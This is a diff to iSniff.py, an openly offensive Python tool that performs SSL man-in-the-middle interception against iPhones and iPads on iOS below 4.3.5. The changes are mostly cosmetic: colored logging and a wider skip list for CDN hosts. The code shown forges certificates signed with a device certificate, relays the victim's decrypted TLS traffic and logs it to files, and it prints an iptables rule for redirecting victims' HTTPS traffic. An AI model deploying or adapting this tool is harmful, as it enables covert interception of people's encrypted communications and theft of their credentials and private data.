@@ -1,6 +1,6 @@
 #! /usr/bin/env python
 
-# iSniff.py [initial release 2011-08-03]
+# iSniff.py [release 2011-08-25]
 #
 # SSL man-in-the-middle tool inspired by Moxie Marlinspike's sslsniff 0.8
 #
@@ -29,6 +29,7 @@
 import M2Crypto, ssl, SocketServer, socket, struct, random, os.path, sys, time
 from SSL_Certificate_CN2 import getCertHostnames
 from threading import Thread
+from color import *
 
 signing_cert = 'iphone_device.pem'
 signing_cert_key = 'iphone_device.key'
@@ -56,7 +57,7 @@ def getCertHostnamesCached (ip):
 	else:
 		NameLookupQueue.update([ip])
 		hostnames = getCertHostnames(ip)
-		print 'Server %s hostnames: %s' % (ip, hostnames)
+		print warning('Server %s hostnames: %s' % (ip, hostnames))
 		return hostnames
 
 def CreateSignedX509Certificate (ip, hostnames, peername):
@@ -66,7 +67,7 @@ def CreateSignedX509Certificate (ip, hostnames, peername):
 		return True
 	else:
 		CertQueue.update([ip])
-		print 'Generating cert for IP %s [%s + %s]' % (ip, hostnames[0], len(hostnames)-1)
+		print warning('Generating cert for IP %s [%s + %s]' % (ip, hostnames[0], len(hostnames)-1))
 	def callback():
 		return 'p'
 	certfile = 'certs/CN_%s_IP_%s.pem' % (hostnames[0], ip) #filename of cert we're going to generate
@@ -105,7 +106,7 @@ def CreateSignedX509Certificate (ip, hostnames, peername):
 	newCert.sign(pkey=signingKey, md='sha1')
 	file(certfile,'w').write(newCert.as_pem()+certchain)
 	GeneratedCert[ip] = (certfile, keyfile)
-	print 'Saved as %s' % certfile
+	print stealthy('Saved as %s' % certfile)
 
 class PipeThread( Thread ):
     pipes = [] #taken from http://code.activestate.com/recipes/114642
@@ -138,8 +139,9 @@ class SingleTCPHandler(SocketServer.BaseRequestHandler):
 	_, dst_port, ip1, ip2, ip3, ip4 = struct.unpack("!HHBBBB8x", dst)
 	dst_ip = '%s.%s.%s.%s' % (ip1,ip2,ip3,ip4)
 	peername = '%s:%s' % (self.request.getpeername()[0], self.request.getpeername()[1])
-	print 'Client %s -> %s:443' % (peername, dst_ip)
+	print success('Client %s -> %s:443' % (peername, dst_ip))
 	RemoteHostnames[dst_ip] = getCertHostnamesCached(dst_ip)
+	#RemoteHostnames[dst_ip] = ['*.*.*.*','*.*.*','*.*','*'] # example fixed wildcard cert
 	CN = RemoteHostnames[dst_ip][0] # SSL_Certificate_CN2 module will return CN as first list element
 	if add_extra_hostnames:
 		import tldextract
@@ -162,21 +164,21 @@ class SingleTCPHandler(SocketServer.BaseRequestHandler):
 					       keyfile=keyfile, ssl_version=ssl.PROTOCOL_TLSv1)
 		PhoneConnected = True
 	except (ssl.SSLError), e:
-		print 'SSLError on connection to phone (%s)' % e
+		print error('SSLError on connection to phone (%s)' % e)
 		self.finish()
 	try:
 		server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		stream_server = ssl.wrap_socket(server_sock)
 		stream_server.connect((dst_ip, 443))
 		if PhoneConnected:
-			if not any(pattern in CN for pattern in ['static.','fbcdn','akamai']):
-				print 'Logging to logs/%s-%s.log' % (CN,peername)
+			if not any(pattern in CN for pattern in ['static','fbcdn','akamai','objects']): # don't bother logging requests to CDN / static content hosts
+				print great_success('Logging to logs/%s-%s.log' % (CN,peername))
 				PipeThread(stream_phone, stream_server, logfile=file('logs/%s-%s.log'% (CN,peername),'a')).start()
 			else:
 				PipeThread(stream_phone, stream_server).start()
 			PipeThread(stream_server, stream_phone).start()
 	except (ssl.SSLError), e:
-		print 'SSLError on connection to server (%s)' % e
+		print error('SSLError on connection to server (%s)' % e)
 	self.finish()
 
 class SimpleServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
@@ -192,9 +194,9 @@ if __name__ == "__main__":
     server = SimpleServer((bind_host, bind_port), SingleTCPHandler)
     # terminate with Ctrl-C
     try:
-    	print 'iSniff.py listening on %s:%s' % (bind_host, bind_port)
-    	print 'Forward traffic from iPhones / iPads running iOS < 4.3.5 using:'
-    	print 'iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports %s\n' % bind_port
+    	print info('iSniff.py listening on %s:%s' % (bind_host, bind_port))
+    	print info('Forward traffic from iPhones / iPads running iOS < 4.3.5 using:')
+    	print info('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports %s\n' % bind_port)
         server.serve_forever()
     except KeyboardInterrupt:
         sys.exit(0)
